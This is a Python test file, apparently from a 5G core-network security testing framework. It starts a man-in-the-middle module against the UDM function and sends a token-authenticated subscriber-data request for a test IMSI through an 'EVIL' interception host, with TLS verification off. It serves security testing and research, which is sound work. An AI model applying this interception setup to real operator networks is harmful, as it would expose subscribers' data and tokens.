import httpx
import json
import urllib

from src.utils.common import ip_list
from src.utils.protocols.api_cn.instance import NFInstance
from src.attacks.api_cn.cn_mitm import CNMitm

def victim_request(ip, uri, data):

    # Create legitimate AMF to test the MITM
    instance: NFInstance = NFInstance.add_random_nf()
    token = instance.get_token(scope="nudm-sdm", target_type="UDM")
    url = ip + uri

    headers = {
        "Accept": "*/*",
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "keep-alive",
        "Authorization": f"Bearer {token}",
    }

    with httpx.Client(http1=False, http2=True, verify=False) as client:

        # Send the request to the target server
        if data:
            query_string = urllib.parse.urlencode(data, doseq=True)
            url += f"?{query_string}"
        response = client.request("GET", url, headers=headers)

    return response.status_code, response.content


def test_manipulation():
    
    assert CNMitm.start("UDM")
   
    ip = f"http://{ip_list['EVIL']}:8000/"  # MITM iP
    supi = "imsi-208930000000001"
    uri = f"nudm-sdm/v2/{supi}/smf-select-data"
    data = {"plmn-id": json.dumps({"mcc": "208", "mnc": "93"})}

    # Send a legitimate request
    code, _ = victim_request(ip, uri, data)
    assert 200 <= code < 300
    
    assert CNMitm.stop() 
